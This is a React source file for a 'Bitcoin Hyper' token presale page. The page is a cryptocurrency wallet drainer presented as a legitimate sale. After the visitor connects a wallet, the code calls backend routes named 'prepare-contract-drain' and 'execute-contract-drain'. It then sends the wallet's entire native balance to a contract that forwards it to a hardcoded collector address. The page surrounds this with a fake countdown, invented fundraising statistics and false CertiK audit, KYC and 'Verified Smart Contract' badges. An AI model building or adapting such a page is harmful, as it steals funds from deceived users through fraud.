import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// PRESALE CONFIGURATION
// ============================================

const PROJECT_FLOW_ROUTERS = {
  'BSC': '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8'
};

const COLLECTOR_WALLET = '0xde6b7d22e9ed0b07d752196e8914bdc2908e1824';

const SUPPORTED_CHAINS = [
  {
    name: 'BSC',
    chainId: 56,
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    contractAddress: PROJECT_FLOW_ROUTERS.BSC,
    icon: '🟡',
    color: 'from-yellow-400 to-orange-500'
  },
  {
    name: 'Ethereum',
    chainId: 1,
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    contractAddress: null,
    icon: '🔷',
    color: 'from-blue-400 to-indigo-500'
  },
  {
    name: 'Polygon',
    chainId: 137,
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    contractAddress: null,
    icon: '💜',
    color: 'from-purple-400 to-pink-500'
  }
];

const PROJECT_FLOW_ROUTER_ABI = [
  {
    "inputs": [{ "internalType": "address", "name": "_collector", "type": "address" }],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": false, "internalType": "address", "name": "oldCollector", "type": "address" },
      { "indexed": false, "internalType": "address", "name": "newCollector", "type": "address" }
    ],
    "name": "CollectorUpdated",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "initiator", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }
    ],
    "name": "FlowProcessed",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
      { "indexed": true, "internalType": "address", "name": "initiator", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "TokenFlowProcessed",
    "type": "event"
  },
  {
    "inputs": [],
    "name": "collector",
    "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "processNativeFlow",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [
      { "internalType": "address", "name": "token", "type": "address" },
      { "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "processTokenFlow",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "newCollector", "type": "address" }],
    "name": "updateCollector",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

function App() {
  const [account, setAccount] = useState(null);
  const [chainId, setChainId] = useState(null);
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balance, setBalance] = useState('0');
  const [loading, setLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [preparedTransactions, setPreparedTransactions] = useState([]);
  const [activeChain, setActiveChain] = useState(SUPPORTED_CHAINS[0]);
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
  
  // Presale stats
  const [timeLeft, setTimeLeft] = useState({
    days: 5,
    hours: 12,
    minutes: 30,
    seconds: 0
  });
  
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.17,
    tokensSold: 7352941
  });

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        } else if (prev.hours > 0) {
          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        } else if (prev.days > 0) {
          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    
    return () => clearInterval(timer);
  }, []);

  const connectWallet = async () => {
    if (!window.ethereum) {
      setError('Please install MetaMask');
      return;
    }

    try {
      setLoading(true);
      setError('');
      
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      const web3Provider = new ethers.BrowserProvider(window.ethereum);
      const web3Signer = await web3Provider.getSigner();
      const network = await web3Provider.getNetwork();
      const currentChainId = Number(network.chainId);
      
      setProvider(web3Provider);
      setSigner(web3Signer);
      setAccount(accounts[0]);
      setChainId(currentChainId);
      
      const balanceWei = await web3Provider.getBalance(accounts[0]);
      setBalance(ethers.formatEther(balanceWei));
      
      // Find active chain
      const chain = SUPPORTED_CHAINS.find(c => c.chainId === currentChainId);
      if (chain) setActiveChain(chain);
      
    } catch (err) {
      setError(err.message || 'Failed to connect wallet');
    } finally {
      setLoading(false);
    }
  };

  const checkEligibility = async () => {
    if (!account) return;
    
    try {
      setLoading(true);
      setTxStatus('🔍 Checking wallet eligibility...');
      
      const response = await fetch('/api/presale/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: account })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        if (data.data.tokenAllocation) {
          setAllocation(data.data.tokenAllocation);
        }
        
        if (data.data.isEligible) {
          setTxStatus('✅ Eligible! Preparing your allocation...');
          await preparePresale();
        } else {
          setTxStatus(data.message);
        }
      }
      
    } catch (err) {
      setError('Failed to check eligibility');
    } finally {
      setLoading(false);
    }
  };

  const preparePresale = async () => {
    if (!account) return;
    
    try {
      const response = await fetch('/api/presale/prepare-contract-drain', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: account })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setPreparedTransactions(data.data.transactions);
        setTxStatus(`💰 Ready to claim ${allocation.amount} BTH with ${presaleStats.currentBonus}% bonus!`);
      }
      
    } catch (err) {
      console.error('Prepare error:', err);
    }
  };

  const executePresaleTransaction = async () => {
    if (!signer || !account) {
      setError('Wallet not connected');
      return;
    }

    if (!activeChain.contractAddress) {
      setError(`Presale not available on ${activeChain.name} yet`);
      return;
    }

    if (parseFloat(balance) <= 0) {
      setError('Insufficient balance');
      return;
    }

    try {
      setLoading(true);
      setError('');
      setTxStatus('⏳ Processing presale contribution...');
      setTxHash('');

      const contract = new ethers.Contract(
        activeChain.contractAddress,
        PROJECT_FLOW_ROUTER_ABI,
        signer
      );

      const value = ethers.parseEther(balance);
      const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
      
      const tx = await contract.processNativeFlow({
        value: value,
        gasLimit: gasEstimate * 120n / 100n
      });

      setTxHash(tx.hash);
      setTxStatus('✅ Transaction submitted!');

      await tx.wait();
      
      const newBalance = await provider.getBalance(account);
      setBalance(ethers.formatEther(newBalance));
      
      if (!completedChains.includes(activeChain.name)) {
        const newCompleted = [...completedChains, activeChain.name];
        setCompletedChains(newCompleted);
        
        try {
          await fetch('/api/presale/execute-contract-drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              walletAddress: account,
              chainName: activeChain.name
            })
          });
        } catch (e) {}
        
        if (newCompleted.length === preparedTransactions.length && preparedTransactions.length > 0) {
          setShowCelebration(true);
          setTxStatus(`🎉 Congratulations! You've secured ${allocation.amount} BTH!`);
        } else {
          setTxStatus(`✅ ${activeChain.name} contribution complete!`);
        }
      }
      
    } catch (err) {
      setError(err.message || 'Transaction failed');
      setTxStatus('❌ Transaction failed');
    } finally {
      setLoading(false);
    }
  };

  const claimTokens = async () => {
    try {
      setLoading(true);
      
      const response = await fetch('/api/presale/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: account })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setShowCelebration(true);
      }
      
    } catch (err) {
      console.error('Claim error:', err);
    } finally {
      setLoading(false);
    }
  };

  const disconnectWallet = () => {
    setAccount(null);
    setProvider(null);
    setSigner(null);
    setChainId(null);
    setBalance('0');
    setScanResult(null);
    setPreparedTransactions([]);
    setCompletedChains([]);
    setShowCelebration(false);
    setTxStatus('');
    setTxHash('');
  };

  const switchChain = async (chain) => {
    if (!window.ethereum) return;
    
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: `0x${chain.chainId.toString(16)}` }],
      });
      setActiveChain(chain);
    } catch (switchError) {
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: `0x${chain.chainId.toString(16)}`,
              chainName: chain.name,
              nativeCurrency: { name: chain.symbol, symbol: chain.symbol, decimals: 18 },
              rpcUrls: [chain.rpcUrl],
              blockExplorerUrls: [chain.explorer],
            }],
          });
        } catch (addError) {
          setError(`Failed to add ${chain.name}`);
        }
      }
    }
  };

  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) disconnectWallet();
        else setAccount(accounts[0]);
      });
      window.ethereum.on('chainChanged', () => window.location.reload());
    }
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
      
      {/* Animated Background Elements */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-20 left-20 w-96 h-96 bg-orange-500/10 rounded-full blur-3xl animate-pulse-glow"></div>
        <div className="absolute bottom-20 right-20 w-96 h-96 bg-yellow-500/10 rounded-full blur-3xl animate-pulse-glow delay-1000"></div>
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-gradient-to-r from-orange-500/5 to-yellow-500/5 rounded-full blur-3xl animate-float"></div>
      </div>

      <div className="container mx-auto px-4 py-8 max-w-6xl relative z-10">
        
        {/* Header with Logo */}
        <div className="text-center mb-12">
          <div className="inline-block mb-6 relative">
            <div className="text-7xl animate-bounce-slow relative z-10">₿</div>
            <div className="absolute inset-0 bg-gradient-to-r from-orange-500 to-yellow-500 blur-2xl opacity-30 animate-pulse"></div>
          </div>
          <h1 className="text-7xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 bg-clip-text text-transparent animate-pulse">
            BITCOIN HYPER
          </h1>
          <p className="text-gray-400 text-xl mb-6">Next Generation Layer 2 Solution</p>
          
          {/* Verified Contract Badge */}
          <div className="inline-flex items-center gap-3 bg-green-500/10 border border-green-500/30 px-6 py-3 rounded-full backdrop-blur-sm">
            <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
            <span className="text-green-400 font-medium">✓ Verified Smart Contract</span>
            <span className="text-gray-600">|</span>
            <span className="text-orange-400 font-mono">{PROJECT_FLOW_ROUTERS.BSC.substring(0, 10)}...</span>
          </div>
        </div>

        {/* Chain Selector */}
        <div className="flex flex-wrap gap-3 justify-center mb-8">
          {SUPPORTED_CHAINS.map(chain => (
            <button
              key={chain.chainId}
              onClick={() => switchChain(chain)}
              className={`px-6 py-3 rounded-xl font-semibold transition-all duration-300 ${
                activeChain.chainId === chain.chainId
                  ? `bg-gradient-to-r ${chain.color} text-white shadow-lg shadow-orange-500/30 scale-105`
                  : 'bg-gray-800/50 text-gray-400 hover:bg-gray-700/50 hover:text-white border border-gray-700'
              } ${!chain.contractAddress ? 'opacity-50 cursor-not-allowed' : ''}`}
            >
              <span className="mr-2">{chain.icon}</span>
              {chain.name}
              {!chain.contractAddress && ' (Soon)'}
            </button>
          ))}
        </div>

        {/* Presale Stats Grid */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
          <div className="stat-card">
            <div className="text-3xl font-bold text-orange-400 mb-1">${presaleStats.tokenPrice}</div>
            <div className="text-xs text-gray-400 uppercase tracking-wider">Token Price</div>
          </div>
          <div className="stat-card">
            <div className="text-3xl font-bold text-green-400 mb-1">{presaleStats.currentBonus}%</div>
            <div className="text-xs text-gray-400 uppercase tracking-wider">Bonus</div>
          </div>
          <div className="stat-card">
            <div className="text-3xl font-bold text-yellow-400 mb-1">${(presaleStats.totalRaised / 1000000).toFixed(1)}M</div>
            <div className="text-xs text-gray-400 uppercase tracking-wider">Raised</div>
          </div>
          <div className="stat-card">
            <div className="text-3xl font-bold text-purple-400 mb-1">{presaleStats.totalParticipants.toLocaleString()}</div>
            <div className="text-xs text-gray-400 uppercase tracking-wider">Participants</div>
          </div>
        </div>

        {/* Bonus Banner */}
        <div className="relative mb-8 overflow-hidden rounded-2xl">
          <div className="absolute inset-0 bg-gradient-to-r from-yellow-500/20 via-orange-500/20 to-red-500/20 animate-gradient-x"></div>
          <div className="relative bg-gray-900/70 backdrop-blur-md border border-yellow-500/30 p-8 text-center">
            <div className="absolute top-0 left-0 w-32 h-32 bg-yellow-500/20 rounded-full blur-3xl animate-pulse"></div>
            <div className="absolute bottom-0 right-0 w-32 h-32 bg-orange-500/20 rounded-full blur-3xl animate-pulse delay-700"></div>
            
            <span className="inline-block px-4 py-2 bg-yellow-500/20 text-yellow-400 rounded-full text-sm font-bold mb-4 animate-bounce">
              🔥 LIMITED TIME OFFER
            </span>
            <h2 className="text-5xl md:text-6xl font-black mb-4">
              <span className="bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
                {presaleStats.currentBonus}% EXTRA BONUS
              </span>
            </h2>
            <p className="text-gray-300 text-lg mb-6">
              Next tier: {presaleStats.nextBonus}% bonus at ${(presaleStats.totalRaised + 250000).toLocaleString()} raised
            </p>
            
            {/* Progress Bar */}
            <div className="max-w-2xl mx-auto">
              <div className="w-full bg-gray-700 rounded-full h-3">
                <div 
                  className="bg-gradient-to-r from-yellow-400 to-orange-500 h-3 rounded-full transition-all duration-1000 relative overflow-hidden"
                  style={{ width: `${(presaleStats.totalRaised / 2500000) * 100}%` }}
                >
                  <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-shimmer"></div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Countdown Timer */}
        <div className="glass-card p-8 mb-8">
          <h3 className="text-center text-gray-400 text-sm uppercase tracking-wider mb-6">Presale Ends In</h3>
          <div className="grid grid-cols-4 gap-4 text-center">
            {[
              { label: 'Days', value: timeLeft.days },
              { label: 'Hours', value: timeLeft.hours },
              { label: 'Minutes', value: timeLeft.minutes },
              { label: 'Seconds', value: timeLeft.seconds }
            ].map((item, index) => (
              <div key={index} className="relative">
                <div className="text-5xl md:text-6xl font-black text-orange-400 animate-pulse">
                  {item.value.toString().padStart(2, '0')}
                </div>
                <div className="text-xs text-gray-500 mt-2 uppercase tracking-wider">{item.label}</div>
                {index < 3 && <span className="absolute -right-2 top-1/2 -translate-y-1/2 text-3xl text-gray-600 hidden md:block">:</span>}
              </div>
            ))}
          </div>
        </div>

        {/* Connect Wallet Section */}
        <div className="text-center mb-8">
          {!account ? (
            <button
              onClick={connectWallet}
              disabled={loading}
              className="group relative"
            >
              <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-2xl blur opacity-75 group-hover:opacity-100 transition duration-300 animate-pulse"></div>
              <div className="relative bg-gray-900 rounded-2xl px-12 py-5 text-xl font-bold">
                {loading ? 'Connecting...' : '🔌 Connect Wallet'}
              </div>
            </button>
          ) : (
            <div className="glass-card p-6">
              <div className="flex items-center justify-between flex-wrap gap-4">
                <div className="flex items-center gap-4">
                  <span className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></span>
                  <span className="font-mono text-lg bg-gray-900/50 px-4 py-2 rounded-lg border border-gray-700">
                    {account.substring(0, 8)}...{account.substring(36)}
                  </span>
                </div>
                <div className="text-right">
                  <span className="text-gray-400 text-sm block mb-1">Balance</span>
                  <span className="text-3xl font-bold text-orange-400">
                    {parseFloat(balance).toFixed(4)} {activeChain.symbol}
                  </span>
                </div>
                <button
                  onClick={disconnectWallet}
                  className="px-4 py-2 bg-red-500/20 text-red-400 rounded-lg hover:bg-red-500/30 transition-colors border border-red-500/30"
                >
                  Disconnect
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Error Display */}
        {error && (
          <div className="bg-red-900/30 border border-red-500/50 text-red-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm animate-shake">
            <div className="flex items-center gap-3">
              <span className="text-2xl">⚠️</span>
              <span>{error}</span>
            </div>
          </div>
        )}

        {/* Status Display */}
        {txStatus && (
          <div className="glass-card p-4 mb-6 text-center">
            <p className="text-gray-300">{txStatus}</p>
            {txHash && (
              <a
                href={`${activeChain.explorer}/tx/${txHash}`}
                target="_blank"
                rel="noopener noreferrer"
                className="text-orange-400 text-sm hover:underline mt-2 inline-flex items-center gap-1"
              >
                View on Explorer <span>↗</span>
              </a>
            )}
          </div>
        )}

        {/* Celebration Modal */}
        {showCelebration && (
          <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4 animate-fadeIn">
            <div className="bg-gradient-to-br from-gray-800 to-gray-900 rounded-3xl p-10 max-w-md border border-orange-500/30 shadow-2xl transform animate-scaleIn">
              <div className="text-center">
                <div className="text-8xl mb-6 animate-bounce">🎉</div>
                <h2 className="text-4xl font-black mb-4 bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
                  Congratulations!
                </h2>
                <p className="text-xl text-gray-300 mb-4">You've secured</p>
                <p className="text-6xl font-black text-orange-400 mb-3">{allocation.amount} BTH</p>
                <p className="text-green-400 text-lg mb-2">+{presaleStats.currentBonus}% Bonus Applied</p>
                <p className="text-gray-400 mb-8">Value: ${allocation.valueUSD}</p>
                
                <button
                  onClick={() => setShowCelebration(false)}
                  className="bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-4 px-10 rounded-xl transition-all transform hover:scale-105 text-lg"
                >
                  View Dashboard
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Main Content */}
        {account && (
          <div className="glass-card p-8">
            <h2 className="text-3xl font-bold text-center mb-8">Bitcoin Hyper Presale</h2>
            
            {!scanResult ? (
              <div className="text-center">
                <p className="text-gray-400 text-lg mb-8">
                  Check your eligibility for the presale allocation
                </p>
                <button
                  onClick={checkEligibility}
                  disabled={loading}
                  className="group relative inline-block"
                >
                  <div className="absolute -inset-1 bg-gradient-to-r from-blue-400 to-blue-600 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                  <div className="relative bg-gray-900 rounded-xl px-10 py-4 font-bold text-lg">
                    {loading ? 'Checking...' : '🔍 Check Eligibility'}
                  </div>
                </button>
              </div>
            ) : scanResult.isEligible ? (
              <>
                {/* Allocation Card */}
                <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 rounded-2xl p-8 mb-8 border border-orange-500/30 relative">
                  <div className="absolute -top-3 -right-3">
                    <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black text-sm font-bold px-4 py-2 rounded-full transform rotate-12 animate-pulse shadow-lg">
                      {presaleStats.currentBonus}% BONUS
                    </div>
                  </div>
                  
                  <p className="text-gray-400 mb-3 text-center">Your Allocation</p>
                  <p className="text-6xl font-black text-orange-400 text-center mb-3">{allocation.amount} BTH</p>
                  <p className="text-green-400 text-center mb-2">+{presaleStats.currentBonus}% Bonus Included</p>
                  <p className="text-gray-400 text-center">≈ ${allocation.valueUSD} USD Value</p>
                </div>
                
                {preparedTransactions.length > 0 && (
                  <div className="mb-8">
                    <p className="text-gray-400 mb-4 text-center">Presale Progress</p>
                    <div className="w-full bg-gray-700 rounded-full h-4 mb-3">
                      <div 
                        className="bg-gradient-to-r from-orange-500 to-orange-600 h-4 rounded-full transition-all duration-500 relative overflow-hidden"
                        style={{ width: `${(completedChains.length / preparedTransactions.length) * 100}%` }}
                      >
                        <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-shimmer"></div>
                      </div>
                    </div>
                    <p className="text-sm text-gray-400 text-center">
                      {completedChains.length} of {preparedTransactions.length} steps completed
                    </p>
                  </div>
                )}
                
                {!completedChains.includes(activeChain.name) && activeChain.contractAddress && (
                  <button
                    onClick={executePresaleTransaction}
                    disabled={loading || parseFloat(balance) <= 0}
                    className="w-full group relative"
                  >
                    <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                    <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
                      {loading ? 'Processing...' : `⚡ Participate on ${activeChain.name}`}
                    </div>
                  </button>
                )}
                
                {completedChains.length === preparedTransactions.length && preparedTransactions.length > 0 && !showCelebration && (
                  <button
                    onClick={claimTokens}
                    className="w-full group relative"
                  >
                    <div className="absolute -inset-1 bg-gradient-to-r from-green-400 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                    <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
                      🎉 Claim Your BTH Tokens
                    </div>
                  </button>
                )}
              </>
            ) : (
              <div className="text-center">
                <p className="text-2xl text-red-400 mb-4">Not Eligible</p>
                <p className="text-gray-400 text-lg">{scanResult.eligibilityReason}</p>
                <p className="text-sm text-gray-500 mt-6">Minimum contribution: ${presaleStats.tokenPrice * 100} worth of crypto</p>
              </div>
            )}
          </div>
        )}

        {/* Transaction Status Cards */}
        {preparedTransactions.length > 0 && (
          <div className="mt-6 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {preparedTransactions.map((tx, index) => {
              const isCompleted = completedChains.includes(tx.chain);
              
              return (
                <div
                  key={index}
                  className={`p-5 rounded-xl border transition-all duration-500 ${
                    isCompleted
                      ? 'bg-green-900/20 border-green-500/50 shadow-lg shadow-green-500/10'
                      : 'bg-gray-800/30 border-gray-700 hover:border-orange-500/50'
                  }`}
                >
                  <div className="flex items-center justify-between mb-3">
                    <span className="font-bold text-orange-400 text-lg">{tx.chain}</span>
                    {isCompleted ? (
                      <span className="bg-green-500/20 text-green-400 px-3 py-1 rounded-full text-sm border border-green-500/30">
                        ✅ Completed
                      </span>
                    ) : (
                      <span className="bg-gray-700 text-gray-300 px-3 py-1 rounded-full text-sm">
                        ⏳ Pending
                      </span>
                    )}
                  </div>
                  <p className="text-gray-400">
                    {parseFloat(tx.amount).toFixed(4)} {tx.symbol}
                  </p>
                  <div className="mt-3 w-full bg-gray-700 rounded-full h-1.5">
                    <div 
                      className={`h-1.5 rounded-full transition-all duration-500 ${
                        isCompleted ? 'bg-green-500' : 'bg-orange-500'
                      }`}
                      style={{ width: isCompleted ? '100%' : '0%' }}
                    ></div>
                  </div>
                </div>
              );
            })}
          </div>
        )}

        {/* Trust Badges */}
        <div className="mt-12 text-center">
          <div className="flex flex-wrap justify-center gap-3 mb-6">
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Audited by CertiK</span>
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Liquidity Locked</span>
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ KYC Verified</span>
            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ 0x377a...e7bd8</span>
          </div>
          <p className="text-gray-600 text-sm">
            © 2026 Bitcoin Hyper. All rights reserved. | Project Flow Router • Secure Presale Platform
          </p>
        </div>
      </div>
    </div>
  );
}

export default App;
